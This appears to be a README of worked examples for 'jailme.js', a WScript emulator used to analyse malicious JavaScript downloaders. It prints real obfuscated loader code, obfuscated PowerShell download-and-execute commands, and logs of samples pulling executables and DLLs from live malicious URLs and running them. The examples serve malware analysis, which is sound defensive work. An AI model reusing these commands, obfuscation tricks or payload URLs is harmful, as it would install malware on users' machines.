# Examples #

## TBD ##

This piece is permuting a text array until it completes the Function body puzzle ... 2,1,3,5,4

    function qqfak() {
        var bwfgg=new Array("}R%","g."+""+"f","h){","e(p","++;","].su","JKX","PTC");
        return bwfgg[Math.floor(Math['rand'+new Array('om')[0]]()*bwfgg.length)];
    }
    function kdorj(hlgwz) {
        return (new Function("eaipe","pbllg","wblzm","var pbusw=eaipe.ma"+"tch(/\\S{5}/g),jatsj=\"\",
            msjdc=0;while(msjdc<pbusw.lengt"+qqfak()+"jatsj+=Strin"+qqfak()+"romCh"+"arC"+"od"+qqfak()+
            "ars"+"eI"+"nt(pbusw[msjdc"+qqfak()+"bstr(3,"+"2),1"+"6)^17);msjdc"+qqfak()+"}eval(jatsj);")(hlgwz,null,null));
    }

Then it performs a standard payload download and execution. Apparently source stil delivering the payload:

    14 Jan 13:51:54 - MSXML2.XMLHTTP[2721].open(GET,http://www.readheat.com/news/1243142.exe,false)
    14 Jan 13:51:56 - Scripting.FileSystemObject[2722].GetSpecialFolder(2) => C:\Users\User\AppData\Local\Temp\
    14 Jan 13:51:56 - ADODB_Stream[2723].content = (object) 'MZ??????????????????????@???????????????????????????????????????????????!??L?!This program cannot be run in DOS mode.???$????????1???P???P???P??*_???P???P??OP??*_???P??s???P??.V???P??Rich?P??????????PE??L????c?W?????????????????b???????????3????????? ... (truncated)'
    14 Jan 13:51:56 - ADODB_Stream[2723].SaveToFile(C:\Users\User\AppData\Local\Temp\\ij0gv0atr.exe, 2)
    14 Jan 13:51:56 - WScript.Shell[2724].Run(C:\Users\User\AppData\Local\Temp\\ij0gv0atr.exe, undefined, undefined)

**malwr.com:** https://malwr.com/analysis/MzY3Y2U1YWMwMjY0NDRjZDgyOTFiYzY3YTVhNjI0ZTE/

**Source code:** malware/20161227/c0a73d4e21e60a370bbaa476f532a02df17e99e5be3389ff550d28c105d518cd.js

**Command:**

    node jailme.js -c ./config_wscript_only.json --down malware/20161227/c0a73d4e21e60a370bbaa476f532a02df17e99e5be3389ff550d28c105d518cd.js

**Output:** [malware/20161227/c0a73d4e21e60a370bbaa476f532a02df17e99e5be3389ff550d28c105d518cd.out](malware/20161227/c0a73d4e21e60a370bbaa476f532a02df17e99e5be3389ff550d28c105d518cd.out)


## Speed Detected Photo.js ##

One with 2nd stage obfuscated into a Powershell command:

    14 Dec 20:23:27 - new WScript.Shell[2]
    14 Dec 20:23:27 - WScript.Shell[2].Run(cmd.exe /c powershell.exe   -ExecutionPolicy  bypass    -noprofile   -windowstyle  hidden $migipk='^$';$kqevovde='^p';$unub='^a';$tygnefb='^t';$sbixeg='^h';$tecgerz='^=';$eryse='^(';$avkuvynb='^$';$qzarach='^e';$ciwyro='^n';$ulmezyq='^v';$ymqumnyzj='^:';$bmohetm='^t';$sideq='^e';$jevefbi='^m';$svepqa='^p';$ulvymu='^+';$kaqsa='^''';$izafso='^.';$wlohosky='^e';$silpox='^x';$aqselev='^e';$levfima='^''';$owaqij='^)';$omyjs='^;';$ahzujf='^(';$omitadk='^N';$arybom='^e';$usnakdipt='^w';$unar='^-';$zype='^O';$ezbaxnaj='^b';$otuxxep='^j';$iquxdo='^e';$uchaquf='^c';$ycydnez='^t';$ftyrbi='^ ';$uljenby='^S';$ywacjy='^y';$oxop='^s';$qibragd='^t';$ravafy='^e';$ogavo='^m';$evewzars='^.';$ygwavu='^N';$ulzuvuz='^e';$ulydo='^t';$irkufipd='^.';$abyhy='^W';$fdoggosdi='^e';$have='^b';$gyjacy='^c';$ywelzikl='^l';$mbiwja='^i';$ijif='^e';$soka='^n';$tdytkud='^t';$qubcagk='^)';$avmyf='^.';$kosev='^D';$lolrowbe='^o';$apas='^w';$yvbujo='^n';$otelwuw='^l';$dsobehhu='^o';$oqav='^a';$odbujqypz='^d';$elcyxcyh='^F';$kezdywt='^i';$hcogwo='^l';$jvuhyvj='^e';$afac='^(';$lvutykpu='^''';$qfyctyva='^h';$acwihge='^t';$fizju='^t';$npynep='^p';$ugnevlek='^:';$ugavcy='^/';$rfatcyw='^/';$dujy='^w';$parasy='^w';$opujy='^w';$gtupe='^.';$aprokpal='^k';$abwysy='^i';$agmif='^t';$nheqysje='^d';$ahybt='^o';$yskanagq='^o';$ajrewnasj='^r';$ebvonwukw='^s';$kcokiz='^.';$foby='^r';$mfobjof='^u';$ucim='^/';$xodedbi='^w';$xkyrniplo='^p';$nzolo='^-';$dqycoxo='^c';$cjyxkowm='^o';$wevcish='^n';$csipy='^t';$mvevdiz='^e';$ebezby='^n';$dpedga='^t';$olnozz='^/';$esgafa='^u';$ykix='^p';$quldar='^l';$egxex='^o';$zybgify='^a';$owbudlap='^d';$owlolo='^s';$osbuzbe='^/';$jytykq='^2';$vjesucle='^0';$alduzav='^1';$umijy='^4';$kicni='^/';$ywerho='^0';$murewpo='^1';$urufemc='^/';$ibqehr='^b';$yjixbu='^8';$vozu='^l';$uvaw='^k';$ubawak='^i';$ipfutem='^f';$rutod='^n';$ekaw='^z';$edtafta='^d';$inawy='^/';$ajfegqo='^C';$ufocu='^o';$equst='^u';$zohuza='^p';$dhawo='^o';$nwipikh='^n';$cywiw='^9';$qgochedw='^8';$fyndik='^5';$uqeda='^4';$juqaty='^.';$yftifoqw='^p';$sawvif='^d';$dtomu='^f';$yshyxik='^''';$pekretv='^,';$xxavludb='^$';$yrjely='^p';$enuke='^a';$xasmopo='^t';$osybho='^h';$zdomum='^)';$trawomo='^;';$loreh='^ ';$qalci='^S';$dqynnof='^t';$ppysy='^a';$zkytbeb='^r';$ovelf='^t';$lajkixa='^-';$fsebi='^P';$ukpab='^r';$lkura='^o';$rfukopn='^c';$ttawefa='^e';$preffojja='^s';$hlofejqu='^s';$yxnefka='^ ';$fwapywj='^$';$mydri='^p';$cape='^a';$ckukxoq='^t';$kbewifn='^h'; Invoke-Expression ($migipk+$kqevovde+$unub+$tygnefb+$sbixeg+$tecgerz+$eryse+$avkuvynb+$qzarach+$ciwyro+$ulmezyq+$ymqumnyzj+$bmohetm+$sideq+$jevefbi+$svepqa+$ulvymu+$kaqsa+$izafso+$wlohosky+$silpox+$aqselev+$levfima+$owaqij+$omyjs+$ahzujf+$omitadk+$arybom+$usnakdipt+$unar+$zype+$ezbaxnaj+$otuxxep+$iquxdo+$uchaquf+$ycydnez+$ftyrbi+$uljenby+$ywacjy+$oxop+$qibragd+$ravafy+$ogavo+$evewzars+$ygwavu+$ulzuvuz+$ulydo+$irkufipd+$abyhy+$fdoggosdi+$have+$gyjacy+$ywelzikl+$mbiwja+$ijif+$soka+$tdytkud+$qubcagk+$avmyf+$kosev+$lolrowbe+$apas+$yvbujo+$otelwuw+$dsobehhu+$oqav+$odbujqypz+$elcyxcyh+$kezdywt+$hcogwo+$jvuhyvj+$afac+$lvutykpu+$qfyctyva+$acwihge+$fizju+$npynep+$ugnevlek+$ugavcy+$rfatcyw+$dujy+$parasy+$opujy+$gtupe+$aprokpal+$abwysy+$agmif+$nheqysje+$ahybt+$yskanagq+$ajrewnasj+$ebvonwukw+$kcokiz+$foby+$mfobjof+$ucim+$xodedbi+$xkyrniplo+$nzolo+$dqycoxo+$cjyxkowm+$wevcish+$csipy+$mvevdiz+$ebezby+$dpedga+$olnozz+$esgafa+$ykix+$quldar+$egxex+$zybgify+$owbudlap+$owlolo+$osbuzbe+$jytykq+$vjesucle+$alduzav+$umijy+$kicni+$ywerho+$murewpo+$urufemc+$ibqehr+$yjixbu+$vozu+$uvaw+$ubawak+$ipfutem+$rutod+$ekaw+$edtafta+$inawy+$ajfegqo+$ufocu+$equst+$zohuza+$dhawo+$nwipikh+$cywiw+$qgochedw+$fyndik+$uqeda+$juqaty+$yftifoqw+$sawvif+$dtomu+$yshyxik+$pekretv+$xxavludb+$yrjely+$enuke+$xasmopo+$osybho+$zdomum+$trawomo+$loreh+$qalci+$dqynnof+$ppysy+$zkytbeb+$ovelf+$lajkixa+$fsebi+$ukpab+$lkura+$rfukopn+$ttawefa+$preffojja+$hlofejqu+$yxnefka+$fwapywj+$mydri+$cape+$ckukxoq+$kbewifn);;, 0, undefined)

**malwr.com:** https://malwr.com/analysis/OTU4YTAyMDgxYzI4NDdlMGI3MTlkNTQyMjc0YTNjZGY/

**Source code:** malware/20161214/5cf27448bf9355692a0448f41f65da625e876e91c66cf6f0a7f7127aed08087b.js

**Command:**

    node jailme.js -c ./config_wscript_only.json malware/20161214/5cf27448bf9355692a0448f41f65da625e876e91c66cf6f0a7f7127aed08087b.js

**Output:** [malware/20161214/5cf27448bf9355692a0448f41f65da625e876e91c66cf6f0a7f7127aed08087b.out](malware/20161214/5cf27448bf9355692a0448f41f65da625e876e91c66cf6f0a7f7127aed08087b.out)


## SHOP_12907.js ##

Source server not delivering the payload anymore:

    10 Dec 22:52:43 - MSXML2.XMLHTTP[5].open(GET,http://www.gooholtan.wang/log.php?f=2.dat,0)
    10 Dec 22:52:44 - MSXML2.XMLHTTP[5].statustext = (string) 'Error: connect EHOSTUNREACH 122.9.46.120:80'

and a bit later:

    10 Dec 23:16:48 - MSXML2.XMLHTTP[5].responsebody = (object) '??<!DOCTYPE html>??<!--[if IEMobile 7]><html class="no-js iem7 oldie"><![endif]-->?<!--[if (IE 7)&!(IEMobile)]><html class="no-js ie7 oldie" lang="en"><![endif]-->?<!--[if (IE 8)&!(IEMobile)]><html class="no-js ie8 oldie" lang="en"><![endif]-->?<!--[ ... (truncated)'

**malwr.com:** https://malwr.com/analysis/MzgyMTUzZWE0NmM1NDQxYmFmNzAzY2E0Nzg0NmM5ZGU/

**Source code:** malware/20161210/24c314dcfdfbfe984e7ca9e83a96f0aea1ac37cf92eab609f8d4916e6cde299e.js

**Command:**

    node jailme.js -c ./config_wscript_only.json --down=y malware/20161210/24c314dcfdfbfe984e7ca9e83a96f0aea1ac37cf92eab609f8d4916e6cde299e.js

**Output:** [malware/20161210/24c314dcfdfbfe984e7ca9e83a96f0aea1ac37cf92eab609f8d4916e6cde299e.out](malware/20161210/24c314dcfdfbfe984e7ca9e83a96f0aea1ac37cf92eab609f8d4916e6cde299e.out)


## DOC_1407.js ##

    28 Oct 14:30:07 - MSXML2.XMLHTTP[10].open(GET,http://bptpm.sragenkab.go.id/7fg3g?JvAPJlCD=qNkyfcBuTVK,false)
    28 Oct 14:30:11 - ADODB_Stream[13].SaveToFile(%TEMP%/qAzAXgsbYJR1.dll, 2)
    28 Oct 14:30:11 - WScript.Shell[9].Run(rundll32  %TEMP%/qAzAXgsbYJR1.dll,EnhancedStoragePasswordConfig, 0, false)

**malwr.com:** https://malwr.com/analysis/ZWM5ZTYzYWU0YWU4NDcwNDljNjQxZDdlODkwMTFkZmQ/

**Source code:** malware/20161028/7396e78d2ae93b29df342f7bdb67ef4f0b6860fb83ce4b14cc3e23613d636407.js

**Command:**

    node jailme.js --down=y malware/20161028/7396e78d2ae93b29df342f7bdb67ef4f0b6860fb83ce4b14cc3e23613d636407.js

**Output:** [malware/20161028/7396e78d2ae93b29df342f7bdb67ef4f0b6860fb83ce4b14cc3e23613d636407.out](malware/20161028/7396e78d2ae93b29df342f7bdb67ef4f0b6860fb83ce4b14cc3e23613d636407.out)

## UGO 472039384.js ##

"Seek and ye shall find":

    28 Oct 14:25:19 - MSXML2.XMLHTTP[10].open(GET,http://google.com/sgatde.php,false)
    28 Oct 14:25:19 - MSXML2.XMLHTTP[10].responseBody = (object) '<!DOCTYPE html>?<html lang=en>?  <meta charset=utf-8>?  <meta name=viewport content="initial-scale=1, minimum-scale=1, width=device-width">?  <title>Error 404 (Not Found)!!1</title>?  <style>?    *{margin:0;padding:0}html,code{font:15px/22px arial,sa ... (truncated)'
    28 Oct 14:25:19 - MSXML2.XMLHTTP[10].status = (number) '404'
    28 Oct 14:25:19 - MSXML2.XMLHTTP[12].open(GET,http://sdch-1VBbDXUNeofdvgfd1c9Oek5sOVBbDXUN571i5Bs.nl/exj71o.tg,false)
    28 Oct 14:25:19 - MSXML2.XMLHTTP[12] statusText = {"code":"ENOTFOUND","errno":"ENOTFOUND","syscall":"getaddrinfo","hostname":"sdch-1vbbdxuneofdvgfd1c9oek5sovbbdxun571i5bs.nl","host":"sdch-1vbbdxuneofdvgfd1c9oek5sovbbdxun571i5bs.nl","port":80}
    28 Oct 14:25:19 - MSXML2.XMLHTTP[14].open(GET,http://ffwli4sHs1eqeofdvgfd1c9OeexTs.nl,false)
    28 Oct 14:25:19 - MSXML2.XMLHTTP[14] statusText = {"code":"ENOTFOUND","errno":"ENOTFOUND","syscall":"getaddrinfo","hostname":"ffwli4shs1eqeofdvgfd1c9oeexts.nl","host":"ffwli4shs1eqeofdvgfd1c9oeexts.nl","port":80}
    28 Oct 14:25:19 - MSXML2.XMLHTTP[16].open(GET,http://cxzwqv1j1s1nsjj5qBch1s1s4s1n3dw1d1nsjj5q.nl,false)
    28 Oct 14:25:19 - MSXML2.XMLHTTP[16] statusText = {"code":"ENOTFOUND","errno":"ENOTFOUND","syscall":"getaddrinfo","hostname":"cxzwqv1j1s1nsjj5qbch1s1s4s1n3dw1d1nsjj5q.nl","host":"cxzwqv1j1s1nsjj5qbch1s1s4s1n3dw1d1nsjj5q.nl","port":80}
    28 Oct 14:25:19 - MSXML2.XMLHTTP[18].open(GET,http://ddqwe41CexN71.nl/D4Eos1CDvIneDEn3dw1ol7e.ch/fjgnt.ico,false)
    28 Oct 14:25:19 - MSXML2.XMLHTTP[18] statusText = {"code":"ENOTFOUND","errno":"ENOTFOUND","syscall":"getaddrinfo","hostname":"ddqwe41cexn71.nl","host":"ddqwe41cexn71.nl","port":80}
    28 Oct 14:25:19 - MSXML2.XMLHTTP[20].open(GET,http://vcBOBDqe5oj2dnsOOBvosOnsO.de/exj71ch4D.tg,false)
    28 Oct 14:25:20 - MSXML2.XMLHTTP[20] statusText = {"code":"ENOTFOUND","errno":"ENOTFOUND","syscall":"getaddrinfo","hostname":"vcbobdqe5oj2dnsoobvosonso.de","host":"vcbobdqe5oj2dnsoobvosonso.de","port":80}
    28 Oct 14:25:20 - MSXML2.XMLHTTP[22].open(GET,http://edc1B-1Dqe5oj2dnsO5dde2ofdvgfd1c9O1dchdend1VBbDXUNB1sO1d.ch/fjgnt.ico,false)
    28 Oct 14:25:20 - MSXML2.XMLHTTP[22] statusText = {"code":"ENOTFOUND","errno":"ENOTFOUND","syscall":"getaddrinfo","hostname":"edc1b-1dqe5oj2dnso5dde2ofdvgfd1c9o1dchdend1vbbdxunb1so1d.ch","host":"edc1b-1dqe5oj2dnso5dde2ofdvgfd1c9o1dchdend1vbbdxunb1so1d.ch","port":80}
    28 Oct 14:25:20 - MSXML2.XMLHTTP[24].open(GET,http://cdd324qieVBbDXUNB1DvDoxsO1d.ch/fjgnt.ico/exj71o.tg,false)
    28 Oct 14:25:20 - MSXML2.XMLHTTP[24] statusText = {"code":"ENOTFOUND","errno":"ENOTFOUND","syscall":"getaddrinfo","hostname":"cdd324qievbbdxunb1dvdoxso1d.ch","host":"cdd324qievbbdxunb1dvdoxso1d.ch","port":80}
    28 Oct 14:25:20 - MSXML2.XMLHTTP[26].open(GET,http://ewB5e5odhtsl1X9e5o.ch/fjgnt.ico/Vqe5oj2dnnl5o1.ch/fjgnt.ico,false)
    28 Oct 14:25:20 - MSXML2.XMLHTTP[26] statusText = {"code":"ENOTFOUND","errno":"ENOTFOUND","syscall":"getaddrinfo","hostname":"ewb5e5odhtsl1x9e5o.ch","host":"ewb5e5odhtsl1x9e5o.ch","port":80}
    28 Oct 14:25:20 - MSXML2.XMLHTTP[28].open(GET,http://wwwtBl5qeofdvgfd1cheoBDKOqj6Pt95o1sO1d.ch/fjgnt.ico,false)
    28 Oct 14:25:20 - MSXML2.XMLHTTP[28] statusText = {"code":"ENOTFOUND","errno":"ENOTFOUND","syscall":"getaddrinfo","hostname":"wwwtbl5qeofdvgfd1cheobdkoqj6pt95o1so1d.ch","host":"wwwtbl5qeofdvgfd1cheobdkoqj6pt95o1so1d.ch","port":80}
    28 Oct 14:25:20 - MSXML2.XMLHTTP[30].open(GET,http://ddDsODitIneDio4.s1e5o1sO1d/s.ch/fjgnt.ico/odj4BXe.tg,false)
    28 Oct 14:25:20 - MSXML2.XMLHTTP[30] statusText = {"code":"ENOTFOUND","errno":"ENOTFOUND","syscall":"getaddrinfo","hostname":"dddsoditinedio4.s1e5o1so1d","host":"dddsoditinedio4.s1e5o1so1d","port":80}
    28 Oct 14:25:20 - MSXML2.XMLHTTP[32].open(GET,http://www.luigirusso.it/_vti_pvt/tusosnd72ms.exe,false)
    28 Oct 14:25:20 - MSXML2.XMLHTTP[32].responseBody = (object) 'MZ??????????????????????@???????????????????????????????????????????????!??L?!This program cannot be run in DOS mode.???$?????????eZ???????????!?????,?6?'???U?V?????????????T?????)??????,?K?????Rich???????????PE??L??????W?????????????????????P??????? ... (truncated)'
    28 Oct 14:25:20 - MSXML2.XMLHTTP[32].status = (number) '200'
    28 Oct 14:25:20 - ADODB_Stream[33].SaveToFile(%TEMP%\70753547.exe, 2)
    28 Oct 14:25:20 - WScript.Shell[31].Run(%TEMP%\70753547.exe, 1, 0)

**malwr.com:** https://malwr.com/analysis/YjY5NjcwNjdkNTZiNGRiMGI1ZDg4NTI1ZDY2MGJjMzQ/

**Source code:** malware/20161028/ddf5e00b01f5841f9ef582e4a9122f549438039ee100088b244c0fa5402a0f5f.js

**Command:**

    node jailme.js --down=y malware/20161028/ddf5e00b01f5841f9ef582e4a9122f549438039ee100088b244c0fa5402a0f5f.js

**Output:** [malware/20161028/ddf5e00b01f5841f9ef582e4a9122f549438039ee100088b244c0fa5402a0f5f.out](malware/20161028/ddf5e00b01f5841f9ef582e4a9122f549438039ee100088b244c0fa5402a0f5f.out)

## FAX_0032.js ##

    28 Oct 14:26:57 - MSXML2.XMLHTTP[10].open(GET,http://metawellness.in/7fg3g?RYbMpYc=FaGrznuDca,false)
    28 Oct 14:27:00 - ADODB_Stream[13].SaveToFile(%TEMP%/GAcKEeTBQDf1.dll, 2)
    28 Oct 14:27:00 - WScript.Shell[9].Run(rundll32  %TEMP%/GAcKEeTBQDf1.dll,EnhancedStoragePasswordConfig, 0, false)

**malwr.com:** https://malwr.com/analysis/OWNiMDU3NWUwNzE0NDZhZWE5MTZhZWE1ZTNhMTY0Nzk/

**Source code:** malware/20161028/353cfa4952a0199b538c6c389d15816430b422959e60b1becfb87463728eb550.js

**Command:**

    node jailme.js --down=y malware/20161028/353cfa4952a0199b538c6c389d15816430b422959e60b1becfb87463728eb550.js

**Output:** [malware/20161028/353cfa4952a0199b538c6c389d15816430b422959e60b1becfb87463728eb550.out](malware/20161028/353cfa4952a0199b538c6c389d15816430b422959e60b1becfb87463728eb550.out)

## FAX_05109.js ##

Pretends to be a game

    28 Oct 14:24:42 - Calling 'new Function(`return  nikeFootballAir23(kolli).split('=');`)'
    28 Oct 14:24:43 - MSXML2.XMLHTTP[10].open(GET,http://entelligy.com/7fg3g?AJehwHrbwF=cnBiNlHm,false)
    28 Oct 14:24:44 - ADODB_Stream[13].SaveToFile(%TEMP%/aSLuKKq1.dll, 2)
    28 Oct 14:24:44 - WScript.Shell[9].Run(rundll32  %TEMP%/aSLuKKq1.dll,EnhancedStoragePasswordConfig, 0, false)

**malwr.com:** https://malwr.com/analysis/Y2NmODkyNTM3OGI1NDNjMTlkZjI2MjUyY2NmYWNjMTI/

**Source code:** malware/20161028/b49b7768b6afada37e9084918e1151a314c29be1728988bcbbc676936f1e7948.js

**Command:**

    node jailme.js --down=y malware/20161028/b49b7768b6afada37e9084918e1151a314c29be1728988bcbbc676936f1e7948.js

**Output:** [malware/20161028/b49b7768b6afada37e9084918e1151a314c29be1728988bcbbc676936f1e7948.out](malware/20161028/b49b7768b6afada37e9084918e1151a314c29be1728988bcbbc676936f1e7948.out)

## SCAN_0519.js ##

A bit of strugle here as we don't have the HTTP redirect implemented yet.

    28 Oct 14:29:11 - Calling 'new Function(`return  nikeFootballAir23(kolli).split('=');`)'
    28 Oct 14:29:11 - MSXML2.XMLHTTP[10].open(GET,http://joomlaexpertdeveloper.com/7fg3g?ELRzLW=AYRflS,false)
    28 Oct 14:29:12 - MSXML2.XMLHTTP[10].responseBody = (object) '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">?<html><head>?<title>301 Moved Permanently</title>?</head><body>?<h1>Moved Permanently</h1>?<p>The document has moved <a href="http://www.joomlaexpertdeveloper.com/7fg3g?ELRzLW=AYRflS">here</a>.</p>?< ... (truncated)'
    28 Oct 14:29:12 - MSXML2.XMLHTTP[10].open(GET,http://investps.com.au/7fg3g?ELRzLW=AYRflS,false)
    28 Oct 14:29:12 - MSXML2.XMLHTTP[10].responseBody = (object) '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">?<html><head>?<title>301 Moved Permanently</title>?</head><body>?<h1>Moved Permanently</h1>?<p>The document has moved <a href="http://www.investps.com.au/7fg3g?ELRzLW=AYRflS">here</a>.</p>?</body></ht ... (truncated)'
    28 Oct 14:29:12 - MSXML2.XMLHTTP[10].open(GET,http://site4.pulusajans.com/7fg3g?ELRzLW=AYRflS,false)
    28 Oct 14:29:12 - MSXML2.XMLHTTP[10].responseBody = (object) '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">?<html><head>?<title>404 Not Found</title>?</head><body>?<h1>Not Found</h1>?<p>The requested URL /7fg3g was not found on this server.</p>?<hr>?<address>Apache Server at site4.pulusajans.com Port 80</a ... (truncated)'
    28 Oct 14:29:12 - MSXML2.XMLHTTP[10].open(GET,http://accademiamoda.com/7fg3g?ELRzLW=AYRflS,false)
    28 Oct 14:29:14 - MSXML2.XMLHTTP[10].responseBody = (object) '???MQTH1TDa1??fl?hF1bVOF?ESLCnBbRI9MRTH1PDa1SPflGhF1bVOFDESL?nBb\V?CR?A?q?`}?q2?.?fA?9(4%(s/"?,?&i[(r&=_p-????5L*?"TL[BL`ESLCnBb.?{?j{d?hkM?k?J??Xa?[yc??vq?nAn??y??S{d?a???i?J??Gj?[yc??e"?xAn?jf??>{d?mg-?j?J??L4?[yc?yf%?zAn?? Z%j{d?PDa1SPflGhF1bVOF?? ... (truncated)'
    28 Oct 14:29:14 - ADODB_Stream[19].content = (object) 'MZ??????????????????????@???????????????????????????????????????????????!??L?!This program cannot be run in DOS mode.???$???????|NB?8/,?8/,?8/,?W0'?9/,??3"?-/,?W0&??/,?1W??:/,?8/,?9/,?? q?;/,?8/-?l/,?=#L?9/,??$r?9/,?=#v?9/,?Rich8/,?????????????????PE ... (truncated)'
    28 Oct 14:29:14 - ADODB_Stream[19].SaveToFile(%TEMP%/aWpHYb4.dll, 2)
    28 Oct 14:29:14 - WScript.Shell[9].Run(rundll32  %TEMP%/aWpHYb4.dll,EnhancedStoragePasswordConfig, 0, false)

**malwr.com:** https://malwr.com/analysis/ZmFkZWVlMjY4NjI1NGQ3MDgxYmMxYTAxZjgxMmJiNWQ/

**Source code:** malware/20161028/7b7bd1e2bd63f233004045f8d3c743af41e0107765b703841b620253243a0732.js

**Command:**

    node jailme.js --down=y malware/20161028/7b7bd1e2bd63f233004045f8d3c743af41e0107765b703841b620253243a0732.js

**Output:** [malware/20161028/7b7bd1e2bd63f233004045f8d3c743af41e0107765b703841b620253243a0732.out](malware/20161028/7b7bd1e2bd63f233004045f8d3c743af41e0107765b703841b620253243a0732.out)

## Invoice INV00249.js ##

This one shows, that analysis is not always fully automatic. We need to patch the malware first:

    --- ece7520d2db75456ebd6f32b01fc79600bbbc2065dbc552bc6077eeaab346771.js.orig	2016-10-22 22:53:52.575444117 +0200
    +++ ece7520d2db75456ebd6f32b01fc79600bbbc2065dbc552bc6077eeaab346771.js	2016-10-22 22:56:28.734991401 +0200
    @@ -2,11 +2,12 @@
     kQsGAMIHpUGT = [];
     while (Pm2kMCcxm0 > (((0x6b80000 >>> 32) >> (0x130 >>> 0x4)) % (1024 >> 10))) {
         L9f7VRIW = ("" + new Date()).split(" ");
    +    // Node has different format of Date than WScript ...
    +    L9f7VRIW = "Sat Oct 22 22:07:32 UTC+0200 2016".split(" ");
         kQsGAMIHpUGT.push(L9f7VRIW[Pm2kMCcxm0 % 6]);
         --Pm2kMCcxm0;
     }
    -
    -function String.prototype.ri() {
    +String.prototype.ri = function() {
         var Ovi1ctaKmK = ((~(~0x1be)) % (~-2));
         var bW4riLXdNJg = this.split('');
         if (Number(kQsGAMIHpUGT[bW4riLXdNJg.length * 6 + 3]) - (((378333168 >>> 4) * (25165824 >>> 21) + (0x59483 << 0x2)) >>> (12 * 0x2)) == (~((~499) << (2 >>> 0x20)))) Ovi1ctaKmK = bW4riLXdNJg.length;

With the new sync-request library we are able to get the payload, following the redirect URL:

    21 Nov 23:11:19 - WScript.Shell[9].ExpandEnvironmentStrings(%TEMP%/vbNU_w19.exe)
    21 Nov 23:11:19 - MSXML2.XMLHTTP[10].open(GET,https://caringhomes-my.sharepoint.com/personal/scroker_grettonhomes_co_uk/_layouts/15/guestaccess.aspx?guestaccesstoken=mIsLpZRC5kC0BSqjuCwQfch5hD0Fx9hHVjmqjREs%2b%2fY%3d&docid=0c192762e149049c5831f008a9b492fa8&rev=1,0)
    21 Nov 23:11:20 - MSXML2.XMLHTTP[10].status = (number) '200'
    21 Nov 23:11:20 - MSXML2.XMLHTTP[10].readystate = (number) '4'
    21 Nov 23:11:20 - MSXML2.XMLHTTP[10].statustext = (string) 'OK'
    21 Nov 23:11:20 - MSXML2.XMLHTTP[10].responsebody = (object) 'MZ??????????????????????@???????????????????????????????????????3#D???)?3#G?O?)?3#S???)?3#U???)?3#Q???)?Rich??)?????????????????PE??L???;?Eh??????????????????????????????????????????@??????????????????????????????????^???????????????????????????????? ... (truncated)'
    21 Nov 23:11:20 - MSXML2.XMLHTTP[10].allresponseheaders = (string) '{"cache-control":"private","content-length":"120808","content-type":"application/pdf","accept-ranges":"bytes","etag":"\"{C192762E-1490-49C5-831F-008A9B492FA8},1\"","server":"Microsoft-IIS/8.5","x-sharepointhealthscore":"0","x-download-options":"noope ... (truncated)'
    21 Nov 23:11:20 - ADODB_Stream[11].Open()
    21 Nov 23:11:20 - ADODB_Stream[11].type = (number) '1'
    21 Nov 23:11:20 - ADODB_Stream[11].content = (object) 'MZ??????????????????????@???????????????????????????????????????3#D???)?3#G?O?)?3#S???)?3#U???)?3#Q???)?Rich??)?????????????????PE??L???;?Eh??????????????????????????????????????????@??????????????????????????????????^???????????????????????????????? ... (truncated)'
    21 Nov 23:11:20 - ADODB_Stream[11].Write(str) - 120808 bytes
    21 Nov 23:11:20 - ADODB_Stream[11].SaveToFile(%TEMP%/vbNU_w19.exe, 2)
    21 Nov 23:11:20 - ADODB_Stream[11].Close()
    21 Nov 23:11:20 - WScript.Shell[9].Run(%TEMP%/vbNU_w19.exe, 0, 0)

**malwr.com:** https://malwr.com/analysis/MjcyY2RjYTU2NTcwNGE1ZmIzMGNlYmY1MDEyNmIzZTY/

**Source code original:** malware/20161022/ece7520d2db75456ebd6f32b01fc79600bbbc2065dbc552bc6077eeaab346771.js.orig

**Source code modified:** malware/20161022/ece7520d2db75456ebd6f32b01fc79600bbbc2065dbc552bc6077eeaab346771.js

**Command:**

    node jailme.js --down=y malware/20161022/ece7520d2db75456ebd6f32b01fc79600bbbc2065dbc552bc6077eeaab346771.js

**Output:** [malware/20161022/ece7520d2db75456ebd6f32b01fc79600bbbc2065dbc552bc6077eeaab346771.out](malware/20161022/ece7520d2db75456ebd6f32b01fc79600bbbc2065dbc552bc6077eeaab346771.out)



## BILL_553.js ##

This one does not run from within a browser, therefore we run with wscript-only config. After deobfuscation the payload is being downloaded with a PowerShell command:

    19 Oct 23:02:17 -  => Executing: malware/20161019/7698627e91bd2db3853b9604b710df43deadea9883ae97468a53d20a9601f2d1.js
    19 Oct 23:02:17 - ActiveXObject(WScript.Shell)
    19 Oct 23:02:17 - Created: WScript.Shell[1]
    19 Oct 23:02:17 - WScript.Shell[1].Run(cmD.exe /c pOWersh^e^Ll.^eXe^   -exe^c^Uti^oN^pO^lic^Y    ^bYpaSs^   
        -n^OPRo^fIle^  -w^IN^D^Ows^Ty^Le  h^IDDen  (^neW-Obj^ec^T S^y^St^e^M^.ne^T.^we^Bc^L^ieNt)^.DoW^N^Loa^dFi^le('http://www.cambridgeok.top/user.php?f=1.dat','%apPdaTa%.eXe');
        ^S^Tart-Pro^ce^ss^ %aPPdata%.eXe, 0, undefined)

**malwr.com:** https://malwr.com/analysis/MGVhMGRjMDNiZDcxNDI5Yzk4NTIxZGYwZTNjZDY0NTk/

**Source code:** malware/20161019/7698627e91bd2db3853b9604b710df43deadea9883ae97468a53d20a9601f2d1.js

**Command:**

    node jailme.js --down=y -c ./config_wscript_only.json malware/20161019/7698627e91bd2db3853b9604b710df43deadea9883ae97468a53d20a9601f2d1.js

**Output:** [malware/20161019/7698627e91bd2db3853b9604b710df43deadea9883ae97468a53d20a9601f2d1.out](malware/20161019/7698627e91bd2db3853b9604b710df43deadea9883ae97468a53d20a9601f2d1.out)


## doc-details_TLQdGH.js ##

Two stages of javascript. Uses Sleep to delay execution. 

**malwr.com:** https://malwr.com/analysis/ZGQyNWQ3OGZjYTg2NGJkNzgwOWJhOWZkNzg1MzJkOTM/

**Source code 1st stage:** malware/20161013/802577e503bd1880e57b3bd3d3ed047d90a0f0aa0dee89a04a90944fc1f74f27.js
**Source code 2nd stage:** malware/20161013/_TMP__XipXkrLd.js

**Commands:**

    node jailme.js malware/20161013/802577e503bd1880e57b3bd3d3ed047d90a0f0aa0dee89a04a90944fc1f74f27.js
    cp output/_TMP__XipXkrLd.js malware/20161013/
    node jailme.js malware/20161013/_TMP__XipXkrLd.js

